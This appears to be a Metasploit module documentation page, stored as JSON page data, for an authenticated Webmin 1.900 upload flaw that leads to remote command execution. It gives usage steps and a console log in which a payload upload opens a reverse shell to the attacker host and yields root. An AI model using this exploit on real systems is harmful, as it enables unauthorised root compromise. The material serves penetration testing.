{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/webmin_upload_exec","result":{"data":{"moduleMetadataJson":{"id":"10bb040c-791a-5458-aafb-9011c5a67e3b","name":"Webmin Upload Authenticated RCE","fullname":"exploit/unix/webapp/webmin_upload_exec","description":"This module exploits an arbitrary command execution vulnerability in Webmin\n        1.900 and lower versions. Any user authorized to the \"Upload and Download\"\n        module can execute arbitrary commands with root privileges.\n\n        In addition, if the 'Running Processes' (proc) privilege is set the user can\n        accurately determine which directory to upload to. Webmin application files\n        can be written/overwritten, which allows remote code execution. The module\n        has been tested successfully with Webmin 1.900 on Ubuntu v18.04.\n\n        Using GUESSUPLOAD attempts to use a default installation path in order to\n        trigger the exploit.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/webmin_upload_exec","documentationSlug":"/modules/documentation/exploit/unix/webapp/webmin_upload_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits an arbitrary command execution vulnerability in Webmin 1.900 and lower versions. Any user authorized to the \"Upload and Download\" module can execute arbitrary commands with root privileges. In addition, if the 'Running Processes' (proc) privilege is set the user can accurately determine which directory to upload to. Webmin application files can be written/overwritten, which allows remote code execution. The module has been tested successfully with Webmin 1.900.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module has been tested with <a href=\"https://sourceforge.net/projects/webadmin/files/webmin/1.900/\">Webmin 1.900</a></p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>GUESSUPLOAD</strong></p>\n<p>Use default installation path <code class=\"language-text\">/usr/share/webmin/</code></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">use exploit/unix/webapp/webmin_upload_exec</code></li>\n<li><code class=\"language-text\">set rhosts &lt;rhost&gt;</code></li>\n<li><code class=\"language-text\">set username &lt;username&gt;</code></li>\n<li><code class=\"language-text\">set password &lt;password&gt;</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-webmin-1900-on-ubuntu-1804-x64\" style=\"position:relative;\"><a href=\"#tested-webmin-1900-on-ubuntu-1804-x64\" aria-label=\"tested webmin 1900 on ubuntu 1804 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested Webmin 1.900 on Ubuntu 18.04 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/webapp/webmin_upload_exec\nmsf5 exploit(unix/webapp/webmin_upload_exec) &gt; set rhosts 172.22.222.154\nrhosts =&gt; 172.22.222.154\nmsf5 exploit(unix/webapp/webmin_upload_exec) &gt; set username unixuser\nusername =&gt; unixuser\nmsf5 exploit(unix/webapp/webmin_upload_exec) &gt; set password unixuser\npassword =&gt; unixuser\nmsf5 exploit(unix/webapp/webmin_upload_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 172.22.222.136:4444 \n[+] Session cookie: 6215747dab393701e0acbb9ac5b7c699\n[*] Target URL =&gt; https://172.22.222.154:10000\n[*] Searching for directory to upload...\n[-] Failed to determine webmin share directory\n[-] Set GUESSUPLOAD to attempt upload to a default location\n[*] Exploit completed, but no session was created.\nmsf5 exploit(unix/webapp/webmin_upload_exec) &gt; set guessupload true\nguessupload =&gt; true\nmsf5 exploit(unix/webapp/webmin_upload_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 172.22.222.136:4444 \n[+] Session cookie: 46cbd354e4532fe55d1a462db128905c\n[*] Target URL =&gt; https://172.22.222.154:10000\n[*] Searching for directory to upload...\n[!] Could not determine upload directory. Using /usr/share/webmin/\n[+] File gxvgsiji.cgi was successfully uploaded.\n[*] Attempting to execute the payload...\n[*] Command shell session 1 opened (172.22.222.136:4444 -&gt; 172.22.222.154:38960) at 2019-03-14 13:40:56 -0500\n[+] Deleted gxvgsiji.cgi\n\nuname -a \nLinux ubuntu 4.18.0-16-generic #17~18.04.1-Ubuntu SMP Tue Feb 12 13:35:51 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\nwhoami\nroot\nexit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"10bb040c-791a-5458-aafb-9011c5a67e3b"}}}